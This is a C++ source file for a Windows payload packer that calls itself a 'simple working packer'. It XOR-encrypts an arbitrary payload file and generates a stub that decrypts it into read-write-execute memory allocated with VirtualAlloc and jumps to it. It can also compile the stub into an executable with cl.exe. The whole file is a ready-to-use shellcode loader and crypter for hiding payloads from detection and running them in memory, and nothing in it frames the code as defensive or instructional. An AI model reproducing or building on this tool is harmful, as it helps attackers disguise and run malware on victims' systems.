#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <sstream>
#include <iomanip>
#include <algorithm>

class SimplePacker {
private:
    std::vector<uint8_t> payload;
    std::string output_file;
    
    // Simple XOR encryption key
    const std::vector<uint8_t> key = {0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48};
    
    std::vector<uint8_t> encrypt_payload(const std::vector<uint8_t>& data) {
        std::vector<uint8_t> encrypted = data;
        for (size_t i = 0; i < encrypted.size(); ++i) {
            encrypted[i] ^= key[i % key.size()];
        }
        return encrypted;
    }
    
    std::string generate_stub() {
        std::stringstream stub;
        stub << "#include <windows.h>\n";
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n\n";
        stub << "int main() {\n";
        stub << "    // Encrypted payload\n";
        stub << "    std::vector<uint8_t> encrypted = {";
        
        auto encrypted = encrypt_payload(payload);
        for (size_t i = 0; i < encrypted.size(); ++i) {
            if (i > 0) stub << ", ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)encrypted[i];
        }
        
        stub << "};\n\n";
        stub << "    // Decryption key\n";
        stub << "    std::vector<uint8_t> key = {";
        for (size_t i = 0; i < key.size(); ++i) {
            if (i > 0) stub << ", ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') << (int)key[i];
        }
        stub << "};\n\n";
        
        stub << "    // Decrypt payload\n";
        stub << "    std::vector<uint8_t> decrypted;\n";
        stub << "    for (size_t i = 0; i < encrypted.size(); ++i) {\n";
        stub << "        decrypted.push_back(encrypted[i] ^ key[i % key.size()]);\n";
        stub << "    }\n\n";
        
        stub << "    // Execute payload\n";
        stub << "    void* exec_mem = VirtualAlloc(0, decrypted.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        stub << "    if (exec_mem) {\n";
        stub << "        memcpy(exec_mem, decrypted.data(), decrypted.size());\n";
        stub << "        ((void(*)())exec_mem)();\n";
        stub << "        VirtualFree(exec_mem, 0, MEM_RELEASE);\n";
        stub << "    }\n\n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
public:
    bool load_payload(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file.is_open()) {
            std::cout << "[ERROR] Cannot open input file: " << filename << std::endl;
            return false;
        }
        
        payload = std::vector<uint8_t>(
            std::istreambuf_iterator<char>(file),
            std::istreambuf_iterator<char>()
        );
        
        file.close();
        std::cout << "[SUCCESS] Loaded payload: " << payload.size() << " bytes" << std::endl;
        return true;
    }
    
    bool pack_to_exe(const std::string& output_filename) {
        if (payload.empty()) {
            std::cout << "[ERROR] No payload loaded" << std::endl;
            return false;
        }
        
        std::string stub_code = generate_stub();
        std::string temp_cpp = "temp_packed.cpp";
        
        // Write stub to temporary file
        std::ofstream temp_file(temp_cpp);
        if (!temp_file.is_open()) {
            std::cout << "[ERROR] Cannot create temporary file" << std::endl;
            return false;
        }
        temp_file << stub_code;
        temp_file.close();
        
        // Compile to exe
        std::string compile_cmd = "cl.exe /std:c++17 /O2 /MT /DWIN32_LEAN_AND_MEAN /EHsc " + 
                                 temp_cpp + " /link /SUBSYSTEM:CONSOLE /MACHINE:x64 " +
                                 "kernel32.lib user32.lib /OUT:" + output_filename;
        
        std::cout << "[INFO] Compiling..." << std::endl;
        int result = system(compile_cmd.c_str());
        
        // Clean up temp file
        remove(temp_cpp.c_str());
        
        if (result == 0) {
            std::cout << "[SUCCESS] Packed executable created: " << output_filename << std::endl;
            return true;
        } else {
            std::cout << "[ERROR] Compilation failed" << std::endl;
            return false;
        }
    }
    
    bool pack_to_cpp(const std::string& output_filename) {
        if (payload.empty()) {
            std::cout << "[ERROR] No payload loaded" << std::endl;
            return false;
        }
        
        std::string stub_code = generate_stub();
        
        std::ofstream output_file(output_filename);
        if (!output_file.is_open()) {
            std::cout << "[ERROR] Cannot create output file: " << output_filename << std::endl;
            return false;
        }
        
        output_file << stub_code;
        output_file.close();
        
        std::cout << "[SUCCESS] C++ source created: " << output_filename << std::endl;
        return true;
    }
};

int main(int argc, char* argv[]) {
    std::cout << "=== SIMPLE WORKING PACKER ===" << std::endl;
    std::cout << "Usage: " << argv[0] << " <input_file> [output_file] [mode]" << std::endl;
    std::cout << "Modes: exe (default), cpp" << std::endl;
    std::cout << "Example: " << argv[0] << " payload.bin output.exe exe" << std::endl;
    std::cout << "Example: " << argv[0] << " payload.bin output.cpp cpp" << std::endl;
    std::cout << std::endl;
    
    if (argc < 2) {
        std::cout << "[ERROR] Input file required" << std::endl;
        return 1;
    }
    
    std::string input_file = argv[1];
    std::string output_file = (argc > 2) ? argv[2] : "output.exe";
    std::string mode = (argc > 3) ? argv[3] : "exe";
    
    SimplePacker packer;
    
    if (!packer.load_payload(input_file)) {
        return 1;
    }
    
    bool success = false;
    if (mode == "exe") {
        success = packer.pack_to_exe(output_file);
    } else if (mode == "cpp") {
        success = packer.pack_to_cpp(output_file);
    } else {
        std::cout << "[ERROR] Invalid mode: " << mode << std::endl;
        return 1;
    }
    
    if (success) {
        std::cout << "[SUCCESS] Packing completed successfully!" << std::endl;
        return 0;
    } else {
        std::cout << "[ERROR] Packing failed" << std::endl;
        return 1;
    }
}